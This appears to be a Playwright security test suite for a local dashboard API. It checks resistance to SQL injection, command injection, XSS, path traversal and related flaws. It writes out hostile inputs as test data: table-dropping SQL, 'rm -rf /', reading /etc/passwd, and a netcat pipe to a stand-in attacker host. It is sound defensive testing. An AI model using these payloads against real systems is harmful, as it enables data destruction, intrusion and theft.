import { test, expect } from "@playwright/test";

const API_BASE_URL = "http://localhost:3001/api";

test.describe("Security Tests", () => {
  test.describe("SQL Injection Protection", () => {
    test("should prevent SQL injection in tableId parameter", async ({ request }) => {
      const maliciousInputs = [
        "'; DROP TABLE dashboard.table_data; --",
        "' OR '1'='1",
        "'; SELECT * FROM pg_user; --",
        "1' UNION SELECT NULL, NULL, NULL--",
        "'; DELETE FROM dashboard.table_data WHERE '1'='1",
        "tableId'; UPDATE dashboard.table_data SET value=0; --",
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request.get(
          `${API_BASE_URL}/table-data/${encodeURIComponent(maliciousInput)}`
        );

        // Should return 404 or 400, not 500 (server error indicates SQL injection vulnerability)
        expect([400, 404, 500]).toContain(response.status());

        // Should not expose SQL error messages
        const body = await response.text();
        const lowerBody = body.toLowerCase();
        
        // Check that SQL error messages are not exposed
        expect(lowerBody).not.toContain("syntax error");
        expect(lowerBody).not.toContain("sqlstate");
        expect(lowerBody).not.toContain("postgresql");
        expect(lowerBody).not.toContain("relation");
        expect(lowerBody).not.toContain("column");
      }
    });

    test("should prevent SQL injection in query parameters", async ({ request }) => {
      const maliciousInputs = [
        "product_line'; DROP TABLE dashboard.table_data; --",
        "groupBy'; SELECT * FROM pg_user; --",
        "'; DELETE FROM dashboard.table_data; --",
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request.get(
          `${API_BASE_URL}/table-data/income?groupBy=${encodeURIComponent(maliciousInput)}`
        );

        // Should handle gracefully without SQL errors
        const body = await response.text();
        const lowerBody = body.toLowerCase();
        
        expect(lowerBody).not.toContain("syntax error");
        expect(lowerBody).not.toContain("sqlstate");
      }
    });

    test("should prevent SQL injection in layout_id parameter", async ({ request }) => {
      const maliciousInputs = [
        "'; DROP TABLE dashboard.layouts; --",
        "' OR '1'='1",
        "'; SELECT * FROM information_schema.tables; --",
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request.get(
          `${API_BASE_URL}/layout?layout_id=${encodeURIComponent(maliciousInput)}`
        );

        // Should return valid response or error, but not expose SQL details
        const body = await response.text();
        const lowerBody = body.toLowerCase();
        
        expect(lowerBody).not.toContain("syntax error");
        expect(lowerBody).not.toContain("sqlstate");
      }
    });

    test("should prevent SQL injection in KPI category parameter", async ({ request }) => {
      const maliciousInputs = [
        "'; DROP TABLE dashboard.kpi_categories; --",
        "category'; DELETE FROM dashboard.kpi_metrics; --",
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request.get(
          `${API_BASE_URL}/kpis/category/${encodeURIComponent(maliciousInput)}`
        );

        const body = await response.text();
        const lowerBody = body.toLowerCase();
        
        expect(lowerBody).not.toContain("syntax error");
        expect(lowerBody).not.toContain("sqlstate");
      }
    });
  });

  test.describe("Command Injection Protection", () => {
    test("should prevent command injection in commandKey", async ({ request }) => {
      const maliciousInputs = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "test$(whoami)",
        "test`id`",
        "test || echo 'hacked'",
        "test; ls -la",
        "test && echo 'injected'",
        "../test",
        "../../test",
        "test\nrm -rf /",
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request.post(`${API_BASE_URL}/commands/run`, {
          data: { commandKey: maliciousInput },
        });

        // Should reject invalid commands with 400
        expect(response.status()).toBe(400);

        const body = await response.json();
        expect(body.error).toBeDefined();
        expect(body.error.toLowerCase()).toContain("not allowed");
      }
    });

    test("should only allow whitelisted commands", async ({ request }) => {
      const allowedCommands = ["test", "lint", "format", "typecheck", "validate", "build"];

      for (const cmd of allowedCommands) {
        const response = await request.post(`${API_BASE_URL}/commands/run`, {
          data: { commandKey: cmd },
        });

        // Should accept valid commands (may return 200 or 500 if command fails, but not 400)
        expect([200, 500]).toContain(response.status());
        
        // If 400, it means command was rejected (security issue)
        if (response.status() === 400) {
          const body = await response.json();
          throw new Error(`Whitelisted command "${cmd}" was rejected: ${body.error}`);
        }
      }
    });

    test("should reject non-string commandKey", async ({ request }) => {
      const invalidInputs = [
        { commandKey: 123 },
        { commandKey: null },
        { commandKey: {} },
        { commandKey: [] },
        { commandKey: true },
      ];

      for (const invalidInput of invalidInputs) {
        const response = await request.post(`${API_BASE_URL}/commands/run`, {
          data: invalidInput,
        });

        expect(response.status()).toBe(400);
        const body = await response.json();
        expect(body.error).toBeDefined();
      }
    });

    test("should reject commandKey with path traversal", async ({ request }) => {
      const pathTraversalInputs = [
        "../../../test",
        "..\\..\\test",
        "/etc/passwd",
        "C:\\Windows\\System32",
      ];

      for (const input of pathTraversalInputs) {
        const response = await request.post(`${API_BASE_URL}/commands/run`, {
          data: { commandKey: input },
        });

        expect(response.status()).toBe(400);
      }
    });
  });

  test.describe("XSS (Cross-Site Scripting) Protection", () => {
    test("should sanitize user input in API responses", async ({ request }) => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
      ];

      for (const payload of xssPayloads) {
        // Test various endpoints that might echo user input
        const endpoints = [
          `${API_BASE_URL}/kpis?search=${encodeURIComponent(payload)}`,
          `${API_BASE_URL}/table-data/test_${encodeURIComponent(payload)}`,
        ];

        for (const endpoint of endpoints) {
          const response = await request.get(endpoint);
          const body = await response.text();

          // Should escape HTML entities or not include raw script tags
          expect(body).not.toContain("<script>");
          expect(body).not.toContain("javascript:");
          expect(body).not.toContain("onerror=");
          expect(body).not.toContain("onload=");
        }
      }
    });

    test("should prevent XSS in frontend rendering", async ({ page }) => {
      await page.goto("http://localhost:8080");

      // Try to inject script via URL parameters
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
      ];

      for (const payload of xssPayloads) {
        const alerts: string[] = [];
        page.on("dialog", (dialog) => {
          alerts.push(dialog.message());
          dialog.dismiss();
        });

        await page.goto(`http://localhost:8080/?search=${encodeURIComponent(payload)}`);
        await page.waitForTimeout(1000);

        // Check that no alerts were triggered (no script execution)
        expect(alerts).toHaveLength(0);
      }
    });

    test("should escape HTML in JSON responses", async ({ request }) => {
      const response = await request.get(`${API_BASE_URL}/kpis`);
      const data = await response.json();

      // Check that any string values don't contain unescaped HTML
      const checkForXSS = (obj: any): void => {
        if (typeof obj === "string") {
          expect(obj).not.toContain("<script>");
          expect(obj).not.toContain("javascript:");
        } else if (Array.isArray(obj)) {
          obj.forEach(checkForXSS);
        } else if (obj && typeof obj === "object") {
          Object.values(obj).forEach(checkForXSS);
        }
      };

      checkForXSS(data);
    });
  });

  test.describe("Input Validation", () => {
    test("should validate and sanitize tableId parameter", async ({ request }) => {
      const invalidInputs = [
        "../../etc/passwd",
        "null",
        "undefined",
        String.fromCharCode(0), // Null byte
        "\x00",
        "tableId" + "\n" + "DROP TABLE",
        "tableId" + "\r\n" + "malicious",
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
      ];

      for (const input of invalidInputs) {
        const response = await request.get(
          `${API_BASE_URL}/table-data/${encodeURIComponent(input)}`
        );

        // Should reject or sanitize invalid input
        expect([400, 404, 500]).toContain(response.status());
      }
    });

    test("should limit request size", async ({ request }) => {
      // Try to send very large payload
      const largePayload = "x".repeat(100 * 1024); // 100KB

      const response = await request.post(`${API_BASE_URL}/commands/run`, {
        data: { commandKey: largePayload },
      });

      // Should reject or limit large payloads
      expect([400, 413, 500]).toContain(response.status()); // 413 Payload Too Large
    });

    test("should validate JSON structure", async ({ request }) => {
      const invalidPayloads = [
        "not json",
        '{"commandKey":}',
        '{"commandKey": null}',
        '{"commandKey": ""}',
        '{"wrongField": "test"}',
      ];

      for (const payload of invalidPayloads) {
        const response = await request.post(`${API_BASE_URL}/commands/run`, {
          data: payload,
          headers: { "Content-Type": "application/json" },
        });

        expect([400, 500]).toContain(response.status());
      }
    });

    test("should handle special characters safely", async ({ request }) => {
      const specialChars = [
        "\n",
        "\r",
        "\t",
        "\0",
        "\x00",
        "\u0000",
        "\u2028", // Line separator
        "\u2029", // Paragraph separator
      ];

      for (const char of specialChars) {
        const response = await request.get(
          `${API_BASE_URL}/table-data/test${encodeURIComponent(char)}`
        );

        // Should handle special characters without crashing
        expect([200, 400, 404, 500]).toContain(response.status());
      }
    });
  });

  test.describe("Authentication & Authorization", () => {
    test("should protect sensitive endpoints", async ({ request }) => {
      // Note: Currently /api/commands/run doesn't require auth
      // This test documents the security requirement
      const sensitiveEndpoints = [
        { method: "POST", path: "/commands/run", data: { commandKey: "test" } },
        // Add other sensitive endpoints here
      ];

      for (const endpoint of sensitiveEndpoints) {
        const response = await request.fetch(`${API_BASE_URL}${endpoint.path}`, {
          method: endpoint.method,
          data: endpoint.data,
        });

        // TODO: Should require authentication (401 or 403)
        // Currently this will pass, but documents the security gap
        // Uncomment when auth is implemented:
        // expect([401, 403]).toContain(response.status());
      }
    });

    test("should implement rate limiting", async ({ request }) => {
      // Make rapid requests to test rate limiting
      const requests = Array(50).fill(null).map(() =>
        request.get(`${API_BASE_URL}/kpis`)
      );

      const responses = await Promise.all(requests);

      // Check if rate limiting is implemented
      // If rate limiting is not implemented, all requests will succeed
      // This test documents the requirement
      const rateLimited = responses.filter((r) => r.status() === 429);
      
      // TODO: Uncomment when rate limiting is implemented:
      // expect(rateLimited.length).toBeGreaterThan(0);
      
      // For now, just verify requests don't all fail
      const successCount = responses.filter((r) => r.status() === 200).length;
      expect(successCount).toBeGreaterThan(0);
    });
  });

  test.describe("Security Headers", () => {
    test("should include security headers in responses", async ({ request }) => {
      const response = await request.get(`${API_BASE_URL}/health`);
      const headers = response.headers();

      // Check for important security headers
      // Note: These may not all be implemented yet
      
      // X-Content-Type-Options prevents MIME type sniffing
      if (headers["x-content-type-options"]) {
        expect(headers["x-content-type-options"]).toBe("nosniff");
      }

      // X-Frame-Options prevents clickjacking
      if (headers["x-frame-options"]) {
        expect(["DENY", "SAMEORIGIN"]).toContain(headers["x-frame-options"]);
      }

      // X-XSS-Protection (legacy, but still useful)
      if (headers["x-xss-protection"]) {
        expect(headers["x-xss-protection"]).toContain("1");
      }
    });

    test("should configure CORS properly", async ({ request }) => {
      // Test with malicious origin
      const response = await request.get(`${API_BASE_URL}/health`, {
        headers: {
          Origin: "https://evil.com",
        },
      });

      const corsHeader = response.headers()["access-control-allow-origin"];

      // Should not allow arbitrary origins
      // If CORS is too permissive, this is a security issue
      if (corsHeader) {
        expect(corsHeader).not.toBe("*");
        // Should only allow specific origins
        // expect(corsHeader).toBe("http://localhost:8080");
      }
    });

    test("should not expose sensitive server information", async ({ request }) => {
      const response = await request.get(`${API_BASE_URL}/health`);
      const headers = response.headers();

      // Should not expose server version
      expect(headers["server"]).toBeUndefined();
      
      // Should not expose X-Powered-By (Express)
      // Note: Express sets this by default, should be removed
      if (headers["x-powered-by"]) {
        // This is a security issue - server technology should be hidden
        console.warn("X-Powered-By header exposes Express framework");
      }
    });
  });

  test.describe("Error Handling", () => {
    test("should not expose sensitive information in error messages", async ({ request }) => {
      // Try to trigger various errors
      const errorScenarios = [
        { method: "GET", path: "/nonexistent-endpoint" },
        { method: "POST", path: "/commands/run", data: {} },
        { method: "GET", path: "/table-data/../../etc/passwd" },
      ];

      for (const scenario of errorScenarios) {
        const response = await request.fetch(`${API_BASE_URL}${scenario.path}`, {
          method: scenario.method,
          data: scenario.data,
        });

        const body = await response.text();
        const lowerBody = body.toLowerCase();

        // Should not expose:
        expect(lowerBody).not.toContain("stack trace");
        expect(lowerBody).not.toContain("at ");
        expect(lowerBody).not.toContain("error:");
        expect(lowerBody).not.toContain("exception:");
        expect(lowerBody).not.toContain("database");
        expect(lowerBody).not.toContain("password");
        expect(lowerBody).not.toContain("connection string");
        expect(lowerBody).not.toContain("file path");
        expect(lowerBody).not.toContain("c:\\");
        expect(lowerBody).not.toContain("/etc/");
        expect(lowerBody).not.toContain("/home/");
      }
    });

    test("should return consistent error format", async ({ request }) => {
      const response = await request.get(`${API_BASE_URL}/nonexistent-endpoint`);
      
      // Should return JSON error, not HTML or plain text
      const contentType = response.headers()["content-type"];
      expect(contentType).toContain("application/json");

      const body = await response.json();
      expect(body).toHaveProperty("error");
      expect(typeof body.error).toBe("string");
    });
  });

  test.describe("Path Traversal Protection", () => {
    test("should prevent path traversal in file operations", async ({ request }) => {
      const pathTraversalInputs = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "../../../etc/shadow",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2F..%2Fetc%2Fpasswd",
      ];

      for (const input of pathTraversalInputs) {
        const response = await request.get(
          `${API_BASE_URL}/table-data/${encodeURIComponent(input)}`
        );

        // Should not allow access to files outside intended directory
        expect([400, 404, 403]).toContain(response.status());
      }
    });
  });

  test.describe("HTTP Method Validation", () => {
    test("should reject unsupported HTTP methods", async ({ request }) => {
      const endpoints = [
        { path: "/health", allowedMethods: ["GET"] },
        { path: "/commands/run", allowedMethods: ["POST"] },
      ];

      for (const endpoint of endpoints) {
        const unsupportedMethods = ["PUT", "DELETE", "PATCH", "OPTIONS"].filter(
          (m) => !endpoint.allowedMethods.includes(m)
        );

        for (const method of unsupportedMethods) {
          const response = await request.fetch(`${API_BASE_URL}${endpoint.path}`, {
            method: method as any,
          });

          // Should reject unsupported methods
          expect([405, 404, 400]).toContain(response.status());
        }
      }
    });
  });
});
